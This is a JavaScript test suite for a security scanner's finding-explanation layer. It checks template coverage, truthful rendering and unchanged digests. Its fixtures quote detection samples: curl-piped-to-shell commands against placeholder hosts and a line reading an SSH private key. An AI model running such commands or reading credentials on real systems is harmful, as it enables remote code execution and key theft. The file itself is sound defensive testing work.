// Item 4 — the finding explanation layer.
// (1) Every statically emittable rule id has a dedicated explanation
//     template (the completeness gate; the inventory is DERIVED from
//     the live sources, so adding a rule without a template fails).
// (2) The gate itself fails when a template is missing (negative test).
// (3) Rendering is truthful: no invented triggers, evidence quoted
//     from the finding itself, REA shape and generated rules handled.
// (4) Attachment is additive and digest-neutral: canonical digests and
//     pack/product finding parity are unchanged.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import {
  explainFinding, attachExplanation, explainRecord, explainDownload, statedFunctionOf,
  checkExplanationCoverage, EXPLANATION_TEMPLATES, EXPLANATION_EXCLUSIONS,
} from '../finding-explain.mjs';
import { scanSourceText, scanDigestOf, RULE_PACK } from '../scan.mjs';
import * as rp from '../shield-rulepack.mjs';
import { RULES, INSTRUCTION_RULES } from '../../lib/rea-rules.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ARMOR_DIR = path.join(HERE, '..');

// Derive every statically emittable rule id from the live sources:
//  - data: the detector pack's src_packs (scan.mjs source lane);
//  - literals: `rule: '<id>'` in the emitting modules;
//  - the format lane's PDF action table, whose rows are tuples
//    ['/Key', '<id>', '<severity>', '<detail>'] rather than rule:
//    properties — swept in that shape so a future PDF rule added to
//    the table is caught by the gate too;
//  - tables: lib/rea-rules.mjs RULES + INSTRUCTION_RULES ids, plus the
//    synthetic ids lib/rea.mjs mints inline (id: and rule: literals).
// Runtime-generated ids (gen.* shields, derivePack extras) are
// unbounded by construction and are covered by derivation/fallback —
// see the module header; they are deliberately NOT in this set.
function emittableRuleIds() {
  const ids = new Set();
  for (const p of RULE_PACK.src_packs) ids.add(p.rule);
  for (const rel of ['scan.mjs', 'shield-rulepack.mjs', 'format-inspect.mjs', 'littlebrother-integration.mjs']) {
    const src = fs.readFileSync(path.join(ARMOR_DIR, rel), 'utf8');
    for (const m of src.matchAll(/rule:\s*'([a-z0-9][a-z0-9._-]*)'/g)) ids.add(m[1]);
  }
  const formatSrc = fs.readFileSync(path.join(ARMOR_DIR, 'format-inspect.mjs'), 'utf8');
  for (const m of formatSrc.matchAll(/',\s*'([a-z][a-z0-9._-]*)',\s*'(?:critical|high|medium|low|info)',/g)) ids.add(m[1]);
  const reaSrc = fs.readFileSync(path.join(ARMOR_DIR, '..', 'lib', 'rea.mjs'), 'utf8');
  for (const m of reaSrc.matchAll(/id:\s*'([a-z][a-z0-9._-]*)'/g)) ids.add(m[1]);
  for (const m of reaSrc.matchAll(/rule:\s*'([a-z][a-z0-9._-]*)'/g)) ids.add(m[1]);
  for (const r of [...RULES, ...INSTRUCTION_RULES]) ids.add(r.id);
  return [...ids].sort();
}

test('coverage gate: every statically emittable rule id has a dedicated template', () => {
  const ids = emittableRuleIds();
  assert.ok(ids.length >= 69, `inventory suspiciously small: ${ids.length}`);
  const { ok, missing, excluded } = checkExplanationCoverage(ids);
  assert.deepEqual(missing, [], `rule ids without an explanation template: ${missing.join(', ')}`);
  assert.equal(ok, true);
  assert.deepEqual(excluded, [], 'exclusion list is expected to be empty — every id is templated');
  // And the reverse direction: no template exists for an id no engine
  // can emit (a stale template would silently rot the other way).
  const stale = Object.keys(EXPLANATION_TEMPLATES).filter((id) => !ids.includes(id));
  assert.deepEqual(stale, [], `templates for ids no source emits: ${stale.join(', ')}`);
});

test('coverage gate: a missing template fails the gate (negative test)', () => {
  const ids = emittableRuleIds();
  const doctored = { ...EXPLANATION_TEMPLATES };
  delete doctored['src-eval-call'];
  const res = checkExplanationCoverage(ids, doctored);
  assert.equal(res.ok, false);
  assert.deepEqual(res.missing, ['src-eval-call']);
  // An unknown future id is reported, not silently passed.
  const res2 = checkExplanationCoverage([...ids, 'some-future-rule'], EXPLANATION_TEMPLATES, EXPLANATION_EXCLUSIONS);
  assert.equal(res2.ok, false);
  assert.deepEqual(res2.missing, ['some-future-rule']);
  // A named exclusion is honored and stays visible in the result.
  const res3 = checkExplanationCoverage(['some-future-rule'], EXPLANATION_TEMPLATES, { 'some-future-rule': 'internal only' });
  assert.equal(res3.ok, true);
  assert.deepEqual(res3.excluded, ['some-future-rule']);
});

test('a dedicated explanation carries all four stages, built from the finding’s own evidence', () => {
  const f = { rule: 'src-shell-pipe-exec', severity: 'high', basis: 'pattern', location: 'install.sh:3', detail: 'downloads a script and pipes it into a shell', excerpt: 'curl https://example.invalid/x.sh | sh' };
  const e = explainFinding(f);
  assert.equal(e.schema, 'scripture-armor.explanation/1');
  assert.equal(e.template, 'dedicated');
  for (const k of ['what', 'where', 'trigger', 'effect', 'certainty', 'text']) assert.ok(e[k] && e[k].length > 20, k);
  assert.ok(e.where.includes('install.sh:3'), 'where names this finding’s location');
  assert.ok(e.where.includes('curl https://example.invalid/x.sh | sh'), 'where quotes this finding’s excerpt');
  assert.match(e.text, /What triggers it:/);
  assert.match(e.certainty, /pattern matched/);
});

test('truthfulness: no location/excerpt, no invented evidence; pattern findings claim no traced path', () => {
  const e = explainFinding({ rule: 'src-eval-call', severity: 'high', basis: 'pattern', detail: 'eval() executes a string as code' });
  assert.match(e.where, /did not record a location/);
  assert.doesNotMatch(e.trigger, /traced|call path/);
  const opaque = explainFinding({ rule: 'binary-high-entropy', severity: 'medium', basis: 'inventory', location: '(whole file)', detail: 'high entropy (7.91)' });
  assert.match(opaque.trigger, /measurement|Nothing triggers/);
});

test('generic fallback: an untemplated runtime-generated rule renders from its own detail, never silently', () => {
  const e = explainFinding({ rule: 'gen-probe-token', severity: 'high', basis: 'pattern', location: 'p.mjs:1', detail: 'probe token ZZPROBE', excerpt: 'ZZPROBE(x);' });
  assert.equal(e.template, 'generic');
  assert.ok(e.what.includes('probe token ZZPROBE'), 'fallback quotes the finding’s own detail');
  assert.ok(e.what.includes('gen-probe-token'));
  for (const k of ['what', 'where', 'trigger', 'effect']) assert.ok(e[k].length > 10, k);
});

test('derived shield rule: gen.<base>.<cycle> renders through its base rule’s template', () => {
  const e = explainFinding({ rule: 'gen.remote_code.pipe.a1b2c3d4', severity: 'reject', basis: 'rea', location: 'x.mjs:9', detail: 'downloads code and runs it', excerpt: 'curl http://x | sh', fix: null });
  assert.equal(e.template, 'derived:remote_code.pipe');
  assert.match(e.what, /generated/);
  assert.match(e.effect, /refused outright/);
});

test('REA shape: why/code/file/line/fix are read; the fix consequence comes from the finding itself', () => {
  const e = explainFinding({ rule: 'credentials.path', kind: 'credentials', why: 'reads stored credentials, keys or browser data', fix: 'files', file: 'tool.mjs', line: 12, code: "fs.readFileSync(os.homedir() + '/.ssh/id_rsa')" });
  assert.equal(e.template, 'dedicated');
  assert.ok(e.where.includes('tool.mjs:12'));
  assert.ok(e.where.includes('.ssh/id_rsa'), 'where quotes the REA code excerpt');
  assert.match(e.effect, /access to files of this kind is cut/);
});

test('attachment is additive and digest-neutral; pack/product parity holds with explanations', () => {
  const text = 'eval("1+1");\nconst x = 1;\n';
  const sha = crypto.createHash('sha256').update(text).digest('hex');
  const a = scanSourceText(text, 'probe.mjs', sha);
  const evalFinding = a.findings.find((f) => f.rule === 'src-eval-call');
  assert.ok(evalFinding.explanation, 'scan findings carry explanations');
  assert.equal(evalFinding.explanation.rule, 'src-eval-call');
  // The pinned clean-probe digest from the B4 suite proves the
  // canonical form (and therefore every sealed digest) is unchanged.
  const clean = scanSourceText('const x = 1;\nconsole.log(x);\n', 'probe-clean.mjs', '0'.repeat(64));
  assert.equal(scanDigestOf(clean), '18903e1aa8e2dfb5aa2a5d3dee759545c4f862c0a0fd126a16b1ae69e1f8f85c');
  // scanWithPack findings remain JSON-identical to the product scanner's.
  const b = rp.scanWithPack(text, 'probe.mjs', sha, rp.BASELINE_PACK);
  assert.equal(JSON.stringify(a.findings), JSON.stringify(b.findings));
  // attachExplanation changes nothing but the added field.
  const raw = { rule: 'src-eval-call', severity: 'high', basis: 'pattern', location: 'a:1', detail: 'd', excerpt: 'e' };
  const attached = attachExplanation(raw);
  assert.deepEqual({ ...attached, explanation: undefined }, { ...raw, explanation: undefined });
  // explainRecord derives the same explanations for a stripped record.
  const stripped = { ...a, findings: a.findings.map(({ explanation, ...rest }) => rest) };
  const reDerived = explainRecord(stripped);
  assert.equal(JSON.stringify(reDerived.findings), JSON.stringify(a.findings));
});

test('download-moment delta: stated function honored, absence stated, findings shown as beyond', () => {
  const pkgText = JSON.stringify({ name: 'handy-tool', description: 'Renames photos in bulk.' });
  const stated = statedFunctionOf({ texts: [{ name: 'package.json', text: pkgText }] });
  assert.equal(stated.source, 'package.json');
  assert.match(stated.text, /handy-tool/);
  assert.match(stated.text, /Renames photos in bulk/);
  const findings = [
    { rule: 'src-shell-pipe-exec', severity: 'high', basis: 'pattern', location: 'install.sh:1', detail: 'downloads a script and pipes it into a shell', excerpt: 'curl x | sh' },
    { rule: 'source-lane-notice', severity: 'info', basis: 'pattern', location: 'install.sh', detail: 'pattern scan' },
  ];
  const d = explainDownload({ artifactName: 'install.sh', format: 'Source text', stated, findings });
  assert.equal(d.schema, 'scripture-armor.download-explanation/1');
  assert.equal(d.beyondCount, 1, 'info findings are not “beyond” claims');
  assert.match(d.text, /Renames photos in bulk/);
  assert.match(d.text, /src-shell-pipe-exec/);
  assert.match(d.text, /choice to keep or discard it is yours/);
  const noStated = explainDownload({ artifactName: 'mystery.bin', format: 'Unknown binary', stated: null, findings: [] });
  assert.match(noStated.text, /does not declare a purpose/);
  assert.match(noStated.text, /not a guarantee of safety/);
});
